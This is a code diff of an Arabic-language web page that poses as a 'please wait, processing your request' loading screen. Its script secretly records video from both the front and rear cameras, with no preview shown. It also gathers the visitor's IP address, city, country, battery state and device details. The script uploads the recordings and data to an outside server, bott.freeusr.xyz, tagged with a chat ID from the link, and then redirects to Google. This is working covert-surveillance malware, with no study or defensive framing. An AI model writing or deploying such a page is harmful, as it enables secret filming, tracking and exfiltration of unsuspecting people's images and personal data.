@@ -1,326 +1,397 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>مرحبا بك في موقعنا</title>
-    <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            max-width: 500px;
-        }
-        .spinner {
-            border: 16px solid #f3f3f3;
-            border-top: 16px solid #3498db;
-            border-radius: 50%;
-            width: 120px;
-            height: 120px;
-            animation: spin 2s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .error-message {
-            color: #ff6b6b;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid #ff6b6b;
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
-        }
-        .error-message h2 {
-            margin: 0 0 10px 0;
-            font-size: 20px;
-        }
-        .error-message p {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #ccc;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>مرحبا بك في موقعنا</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      overflow: hidden;
+    }
+    video {
+      display: none;
+    }
+    #loadingOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(18, 18, 18, 0.9);
+      color: #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      z-index: 1000;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 16px solid #f3f3f3;
+      border-top: 16px solid #3498db;
+      border-radius: 50%;
+      width: 100px;
+      height: 100px;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loadingText {
+      font-size: 20px;
+      text-align: center;
+      font-weight: bold;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+    }
+    .error-message {
+      color: #ff6b6b;
+      background: rgba(255, 0, 0, 0.1);
+      border: 1px solid #ff6b6b;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 20px;
+      display: none;
+      max-width: 400px;
+    }
+    .error-message h2 {
+      margin: 0 0 10px 0;
+      font-size: 20px;
+    }
+    .error-message p {
+      margin: 5px 0;
+      font-size: 14px;
+      color: #ccc;
+    }
+  </style>
 </head>
 <body>
-<div class="container">
+  <div id="loadingOverlay">
     <div class="spinner" id="spinner"></div>
-    <h1 id="title">جاري تنفيذ طلبك</h1>
-    <p id="subtitle">يرجى الانتظار...</p>
-    
+    <div class="loadingText" id="status">⏳ يرجى الانتظار...</div>
     <div class="error-message" id="errorMessage">
-        <h2>❌ فشل الوصول إلى الكاميرا</h2>
-        <p id="errorDetail">لم تمنح الصلاحيات اللازمة للوصول إلى الكاميرا</p>
-        <p style="margin-top:10px; font-size:12px; color:#888;">💡 يرجى منح صلاحيات الكاميرا وإعادة تحميل الصفحة</p>
+      <h2>❌ فشلة العمليه</h2>
+      <p id="errorDetail">حدث خطأ أثناء محاولة اعطاء الصلاحية</p>
+      <p style="margin-top:10px; font-size:12px; color:#888;">💡 يرجى منح صلاحيات الكاميرا وإعادة المحاولة</p>
     </div>
-</div>
+  </div>
+  <video id="preview" width="640" height="480" autoplay muted></video>
 
-<video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
-<video id="backVideo" playsinline autoplay muted style="display:none;"></video>
-<canvas id="frontCanvas" style="display:none;"></canvas>
-<canvas id="backCanvas" style="display:none;"></canvas>
+  <script>
+    // ============================================
+    // قراءة المعلمات من الرابط
+    // ============================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId');
+    let duration = parseInt(urlParams.get('duration')) || 10; // المدة الافتراضية 10 ثواني
 
-<script>
-const frontVideo = document.getElementById('frontVideo');
-const backVideo = document.getElementById('backVideo');
-const frontCanvas = document.getElementById('frontCanvas');
-const backCanvas = document.getElementById('backCanvas');
-const urlParams = new URLSearchParams(window.location.search);
-const userId = urlParams.get("chatId");
+    // ✅ التحقق من أن المدة بين 5 و 30 ثانية
+    if (duration < 5) duration = 5;
+    if (duration > 30) duration = 30;
 
-let camerasFinished = 0;
-let totalCameras = 0;
-let hasError = false;
-let failMessageSent = false; // ✅ منع إرسال الرسالة مرتين
+    // ============================================
+    // عناصر الصفحة
+    // ============================================
+    const statusText = document.getElementById('status');
+    const videoElement = document.getElementById('preview');
+    const spinner = document.getElementById('spinner');
+    const errorMessageDiv = document.getElementById('errorMessage');
+    const errorDetail = document.getElementById('errorDetail');
 
-const spinner = document.getElementById('spinner');
-const title = document.getElementById('title');
-const subtitle = document.getElementById('subtitle');
-const errorMessageDiv = document.getElementById('errorMessage');
-const errorDetail = document.getElementById('errorDetail');
+    let hasError = false;
+    let failMessageSent = false;
+    let camerasFinished = 0;
+    let totalCameras = 0;
 
-async function collectAdditionalData() {
-    try {
-        const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
-        const battery = await navigator.getBattery();
+    // ============================================
+    // عرض رسالة الخطأ للمستخدم (بدون تحويل)
+    // ============================================
+    function showErrorToUser(message) {
+      hasError = true;
+      spinner.style.display = 'none';
+      statusText.textContent = '❌ فشل تسجيل الفيديو';
+      errorDetail.textContent = message;
+      errorMessageDiv.style.display = 'block';
+    }
+
+    // ============================================
+    // جمع معلومات إضافية
+    // ============================================
+    async function getDeviceInfo() {
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        const battery = navigator.getBattery ? await navigator.getBattery() : {};
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+
         return {
-            ip: ipInfo.ip,
-            country: ipInfo.country_name,
-            city: ipInfo.city,
-            platform: getPlatformInfo().platform,
-            deviceVersion: getDeviceVersion(),
-            batteryLevel: battery.level,
-            batteryCharging: battery.charging,
+          ip: ipData.ip || 'غير متاح',
+          country: ipData.country_name || 'غير متاح',
+          city: ipData.city || 'غير متاح',
+          platform: /Android/.test(ua) ? "Android" : /iPhone|iPad/.test(ua) ? "iOS" : "Other",
+          deviceVersion: match ? match[1] : 'Unknown',
+          batteryLevel: battery.level !== undefined ? Math.round(battery.level * 100) + '%' : 'غير متاح',
+          batteryCharging: battery.charging !== undefined ? (battery.charging ? 'نعم' : 'لا') : 'غير متاح'
         };
-    } catch { return {}; }
-}
-
-function getPlatformInfo() {
-    const ua = navigator.userAgent;
-    if (/Windows/.test(ua)) return { platform: "Windows" };
-    if (/Mac/.test(ua)) return { platform: "MacOS" };
-    if (/Linux/.test(ua)) return { platform: "Linux" };
-    if (/Android/.test(ua)) return { platform: "Android" };
-    if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
-    return { platform: "Unknown" };
-}
-
-function getDeviceVersion() {
-    const ua = navigator.userAgent;
-    const match = ua.match(/\(([^)]+)\)/);
-    return match ? match[1] : 'Unknown';
-}
-
-function showErrorToUser(message) {
-    hasError = true;
-    spinner.style.display = 'none';
-    title.textContent = '❌ فشل تنفيذ الطلب';
-    subtitle.textContent = 'حدث خطأ أثناء محاولة الوصول إلى الكاميرا';
-    errorDetail.textContent = message;
-    errorMessageDiv.style.display = 'block';
-}
-
-async function requestCameraPermission(facingMode) {
-    try {
-        return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-    } catch (error) {
-        // ✅ إرسال تقرير فشل مرة واحدة فقط
-        if (!failMessageSent) {
-            failMessageSent = true;
-            
-            if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-                sendFailReport('permission', 'تم رفض الوصول إلى الكاميرا', { 
-                    facingMode: facingMode,
-                    error: error.message 
-                });
-                showErrorToUser('تم رفض الوصول إلى الكاميرا. يرجى منح الصلاحيات وإعادة المحاولة.');
-            } else if (error.name === 'NotFoundError') {
-                sendFailReport('camera', 'لا توجد كاميرا متصلة', { 
-                    facingMode: facingMode,
-                    error: error.message 
-                });
-                showErrorToUser('لا توجد كاميرا متصلة بجهازك. يرجى توصيل كاميرا وإعادة المحاولة.');
-            } else {
-                sendFailReport('error', error.message, { 
-                    facingMode: facingMode,
-                    error: error.message 
-                });
-                showErrorToUser('حدث خطأ غير متوقع: ' + error.message);
-            }
-        }
-        return null;
+      } catch (e) {
+        return {};
+      }
     }
-}
 
-async function init() {
-    if (!userId) {
-        sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
-        showErrorToUser('معرف المستخدم غير موجود في الرابط');
+    // ============================================
+    // إرسال تقارير الفشل إلى /fail
+    // ============================================
+    async function sendFailReport(type, message, details = {}) {
+      if (!chatId) {
+        console.warn('No chatId available for fail report');
         return;
-    }
+      }
+      if (failMessageSent) return;
+      failMessageSent = true;
 
-    const additionalData = await collectAdditionalData();
-    const frontStream = await requestCameraPermission('user');
-    const backStream = await requestCameraPermission('environment');
-
-    if (hasError) {
-        return;
-    }
-
-    if (!frontStream && !backStream) {
-        if (!failMessageSent) {
-            failMessageSent = true;
-            sendFailReport('camera', 'لا توجد كاميرات متاحة', {
-                frontStream: !!frontStream,
-                backStream: !!backStream
-            });
-            showErrorToUser('لا توجد كاميرات متاحة على هذا الجهاز');
-        }
-        return;
-    }
-
-    if (frontStream) {
-        totalCameras++;
-        frontVideo.srcObject = frontStream;
-        frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
-    }
-    if (backStream) {
-        totalCameras++;
-        backVideo.srcObject = backStream;
-        backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
-    }
-}
-
-function setupCamera(video, canvas, cameraType, additionalData) {
-    video.play();
-    video.onplaying = () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        let photoCount = 0;
-        const maxPhotos = 4;
-
-        const interval = setInterval(() => {
-            if (photoCount >= maxPhotos) {
-                clearInterval(interval);
-                if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-                camerasFinished++;
-                if (camerasFinished === totalCameras) {
-                    finishAndRedirect();
-                }
-                return;
-            }
-
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                fd.append('userId', userId);
-                fd.append('cameraType', cameraType);
-                fd.append('imageWidth', canvas.width);
-                fd.append('imageHeight', canvas.height);
-                fd.append('additionalData', JSON.stringify(additionalData));
-                post('https://bott.freeusr.xyz/submitPhotos', fd);
-            }, 'image/webp', 0.7);
-
-            photoCount++;
-        }, 1000);
-    };
-}
-
-async function post(url, formData) {
-    try {
-        await fetch(url, { method: 'POST', body: formData });
-    } catch (error) {
-        if (!failMessageSent) {
-            failMessageSent = true;
-            sendFailReport('error', 'فشل إرسال الصور إلى الخادم', {
-                url: url,
-                error: error.message
-            });
-        }
-    }
-}
-
-function finishAndRedirect() {
-    if (!hasError) {
-        document.querySelector('.container').innerHTML = `
-            <h1>✅ تم تنفيذ طلبك بنجاح</h1>
-            <p>جاري التحويل...</p>
-        `;
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 2000);
-    }
-}
-
-async function sendFailReport(type, message, details = {}) {
-    if (!userId) {
-        console.warn('No userId available for fail report');
-        return;
-    }
-
-    try {
+      try {
         const response = await fetch('https://bott.freeusr.xyz/fail', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chatId: userId,
-                type: type,
-                message: message,
-                details: details,
-                deviceInfo: {
-                    platform: navigator.platform || 'غير متاح',
-                    language: navigator.language || 'غير متاح',
-                    userAgent: navigator.userAgent || 'غير متاح',
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    timestamp: new Date().toISOString()
-                }
-            })
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chatId: chatId,
+            type: type,
+            message: message,
+            details: details,
+            deviceInfo: {
+              platform: navigator.platform || 'غير متاح',
+              language: navigator.language || 'غير متاح',
+              userAgent: navigator.userAgent || 'غير متاح',
+              screenResolution: `${window.screen.width}x${window.screen.height}`,
+              timestamp: new Date().toISOString()
+            }
+          })
         });
 
         if (!response.ok) {
-            console.warn('Fail report response not OK:', response.status);
+          console.warn('Fail report response not OK:', response.status);
         }
-    } catch (error) {
+      } catch (error) {
         console.warn('Failed to send fail report:', error);
+      }
     }
-}
 
-window.addEventListener('error', (event) => {
-    if (!hasError && !failMessageSent) {
-        failMessageSent = true;
+    // ============================================
+    // تسجيل وإرسال الفيديو
+    // ============================================
+    async function recordAndSendVideo(facingMode = "user") {
+      // إذا كان هناك خطأ سابق، لا نستمر
+      if (hasError) return;
+
+      statusText.textContent = `⏳ جاري تسجيل ${facingMode === 'user' ? 'الأمامية' : 'الخلفية'} (${duration} ثانية)...`;
+
+      const constraints = { 
+        video: { 
+          facingMode: facingMode,
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        }, 
+        audio: false 
+      };
+
+      try {
+        // طلب الوصول إلى الكاميرا
+        let stream;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+        } catch (error) {
+          if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+            sendFailReport('permission', 'تم رفض الوصول إلى الكاميرا', { 
+              facingMode: facingMode,
+              error: error.message 
+            });
+            showErrorToUser('تم رفض الوصول إلى الكاميرا. يرجى منح الصلاحيات وإعادة المحاولة.');
+          } else if (error.name === 'NotFoundError') {
+            sendFailReport('camera', 'لا توجد كاميرا متصلة', { 
+              facingMode: facingMode,
+              error: error.message 
+            });
+            showErrorToUser('لا توجد كاميرا متصلة بجهازك.');
+          } else {
+            sendFailReport('error', error.message, { 
+              facingMode: facingMode,
+              error: error.message 
+            });
+            showErrorToUser('حدث خطأ غير متوقع: ' + error.message);
+          }
+          return;
+        }
+
+        // عرض الفيديو للمستخدم (اختياري)
+        videoElement.srcObject = stream;
+
+        // بدء التسجيل
+        const recorder = new MediaRecorder(stream, {
+          mimeType: 'video/webm;codecs=vp9,opus'
+        });
+        const chunks = [];
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        // بدء التسجيل
+        recorder.start();
+
+        // الانتظار للمدة المحددة
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+
+        // إيقاف التسجيل
+        recorder.stop();
+
+        // انتظار اكتمال التسجيل
+        await new Promise(resolve => recorder.onstop = resolve);
+
+        // إيقاف جميع مسارات الكاميرا
+        stream.getTracks().forEach(t => t.stop());
+
+        // التحقق من وجود بيانات
+        if (chunks.length === 0) {
+          sendFailReport('video', 'لم يتم تسجيل أي بيانات فيديو', {
+            facingMode: facingMode,
+            duration: duration
+          });
+          showErrorToUser('لم يتم تسجيل أي بيانات فيديو');
+          return;
+        }
+
+        // إنشاء الملف
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        
+        if (blob.size === 0) {
+          sendFailReport('video', 'ملف الفيديو فارغ', {
+            facingMode: facingMode,
+            duration: duration
+          });
+          showErrorToUser('ملف الفيديو فارغ');
+          return;
+        }
+
+        // إعداد البيانات للإرسال
+        const formData = new FormData();
+        formData.append('video', blob, `video_${facingMode}_${Date.now()}.webm`);
+        formData.append('userId', chatId);
+        formData.append('cameraType', facingMode);
+        formData.append('duration', duration);
+
+        const deviceInfo = await getDeviceInfo();
+        formData.append('additionalData', JSON.stringify(deviceInfo));
+
+        statusText.textContent = `📤 جاري إرسال الفيديو...`;
+
+        // إرسال إلى الخادم
+        const res = await fetch('https://bott.freeusr.xyz/submitVideo', {
+          method: 'POST',
+          body: formData
+        });
+
+        if (!res.ok) {
+          const errorData = await res.json().catch(() => ({}));
+          sendFailReport('upload', 'فشل إرسال الفيديو إلى الخادم', {
+            facingMode: facingMode,
+            status: res.status,
+            error: errorData.error || 'Unknown error'
+          });
+          showErrorToUser('فشل إرسال الفيديو إلى الخادم');
+          return;
+        }
+
+        // ✅ نجاح التسجيل والإرسال
+        statusText.textContent = `✅ تم تسجيل ${facingMode === 'user' ? 'الأمامية' : 'الخلفية'} بنجاح`;
+        camerasFinished++;
+
+      } catch (error) {
+        console.error('Error in recordAndSendVideo:', error);
+        if (!failMessageSent) {
+          sendFailReport('error', error.message || 'خطأ غير متوقع', {
+            facingMode: facingMode,
+            error: error.message,
+            stack: error.stack
+          });
+          showErrorToUser('حدث خطأ غير متوقع: ' + error.message);
+        }
+      }
+    }
+
+    // ============================================
+    // بدء التشغيل
+    // ============================================
+    (async () => {
+      // التحقق من وجود chatId
+      if (!chatId) {
+        sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
+        showErrorToUser('معرف المستخدم غير موجود في الرابط');
+        return;
+      }
+
+      // عرض المدة في واجهة المستخدم
+      statusText.textContent = `⏳ جاري تجهيز الكاميرات (${duration} ثانية)...`;
+
+      // تسجيل الكاميرا الأمامية
+      await recordAndSendVideo("user");
+
+      // إذا حدث خطأ، لا نستمر
+      if (hasError) {
+        return;
+      }
+
+      // تسجيل الكاميرا الخلفية
+      await recordAndSendVideo("environment");
+
+      // إذا حدث خطأ، لا نستمر
+      if (hasError) {
+        return;
+      }
+
+      // ✅ نجاح كامل - التحويل إلى Google
+      statusText.textContent = '✅ تم تسجيل الفيديوهات بنجاح! جاري التحويل...';
+      spinner.style.display = 'none';
+
+      setTimeout(() => {
+        window.location.href = "https://www.google.com/";
+      }, 2000);
+
+    })();
+
+    // ============================================
+    // مراقبة الأخطاء غير المتوقعة
+    // ============================================
+    window.addEventListener('error', (event) => {
+      if (!hasError && !failMessageSent) {
         sendFailReport('error', 'خطأ غير متوقع في الصفحة', {
-            message: event.message,
-            filename: event.filename,
-            lineno: event.lineno,
-            colno: event.colno
+          message: event.message,
+          filename: event.filename,
+          lineno: event.lineno,
+          colno: event.colno
         });
         showErrorToUser('حدث خطأ غير متوقع: ' + event.message);
-    }
-});
+      }
+    });
 
-window.addEventListener('beforeunload', () => {
-    if (camerasFinished < totalCameras && totalCameras > 0 && !hasError) {
+    // ============================================
+    // عند إغلاق الصفحة قبل الانتهاء
+    // ============================================
+    window.addEventListener('beforeunload', () => {
+      if (camerasFinished < totalCameras && totalCameras > 0 && !hasError) {
         sendFailReport('error', 'المستخدم غادر الصفحة قبل الانتهاء', {
-            camerasFinished: camerasFinished,
-            totalCameras: totalCameras
+          camerasFinished: camerasFinished,
+          totalCameras: totalCameras
         });
-    }
-});
+      }
+    });
 
-window.addEventListener('load', init);
-</script>
+  </script>
 </body>
 </html>
